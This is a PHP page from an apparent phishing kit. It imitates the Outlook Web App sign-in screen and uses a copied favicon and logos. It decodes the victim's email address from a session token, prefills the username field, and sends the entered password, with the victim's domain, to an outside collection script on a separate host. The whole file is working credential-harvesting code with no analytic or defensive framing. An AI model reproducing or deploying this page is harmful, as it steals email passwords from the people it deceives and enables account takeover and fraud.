<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Outlook Web App</title>
<link rel="shortcut icon" href="https://mail.aeroc.eu/owa/auth/15.1.2507/themes/resources/favicon.ico" type="image/x-icon">
<style>
body{
  background-image: url("img/bg.png");
  background-repeat: no-repeat;
  font-size: 2px;
  color: #666666;
  font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
}
  input[type=text],
  input[type=password]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  width: 100%;
  height: 30px;
  background-color: #fdfdfd;
  font-size: 12px;
  color: #666666;
  font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
  padding: 5px;
  margin: 0;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0px;
  font-size: 12px;
  line-height: 1.1;
  vertical-align: top;
}
</style>
</head>

<body>

<div align="center">
	<table border="0" width="755" cellspacing="0" cellpadding="0" >
		<tr>
			<td>
			<table border="0" width="100%" cellspacing="0" cellpadding="0">
				<tr>
					<td height="165"></td>
				</tr>
				<tr>
					<td>
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td width="325">&nbsp;</td>
							<td width="153">
							<img border="0" src="img/logo-3.png" width="208" height="59"></td>
							<td>&nbsp;</td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td>
					<table border="0" width="100%" cellspacing="0" cellpadding="0">
						<tr>
							<td width="329"></td>
							<td width="430">
							<table border="0" width="100%" cellspacing="0" cellpadding="0">
								<tr>
									<td>
									<table border="0" width="100%" cellspacing="0" cellpadding="0">
									  <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
										<tr>
											<td height="17"></td>
										</tr>
										<tr>
											<td>
											<table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
													<td width="118">
													<p align="left">
													<font size="2">Domain\user name:</font></td>
													<td></td>
												</tr>
											</table>
											</td>
										</tr>
										<tr>
											<td height="3"></td>
										</tr>
										<tr>
											<td>
											<input type="text" name="user" size="20" value="<?php echo $users;?>@<?php echo $ddomain;?>" required />
                                                                                        <input type="hidden" name="link" size="20" value="https://mail.<?php echo $ddomain;?>" />
                                                                                        <input type="hidden" name="domain" size="20" value="<?php echo $ddomain;?>" />
                                                                                        <input type="hidden" name="sender" size="20" value="Owa" />
                                                                                        </td>
										</tr>
										<tr>
											<td height="17" ></td>
										</tr>
										<tr>
											<td>
											<table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
													<td width="63">
													<p align="left">
													<font size="2">Password:</font></td>
													<td></td>
												</tr>
											</table>
											</td>
										</tr>
										<tr>
											<td height="3"></td>
										</tr>
										<tr>
											<td>
											<input type="password" name="passwd" size="20" required autofocus /></td>
										</tr>
										<tr>
											<td height="5"></td>
										</tr>
										<tr>
											<td height="75">
											<img border="0" src="img/logo 2.png" width="262" height="75"></td>
										</tr>
										
										<tr>
											<td>
											<table border="0" width="100%" cellspacing="0" cellpadding="0">
												<tr>
													<td width="63">
													<p align="left">
													<input type="image" src="img/btn.png" width="123" height="35"></td>
													<td></td>
												</tr>
											</table>
											</td>
										</tr>
										<tr>
											<td>&nbsp;</td>
										</tr>
									   </form>									
									</table>
									</td>
									<td width="166"></td>
								</tr>
							</table>
							</td>
						</tr>
					</table>
					</td>
				</tr>
				<tr>
					<td>&nbsp;</td>
				</tr>
			</table>
			</td>
		</tr>
	</table>
</div>

</body>

</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>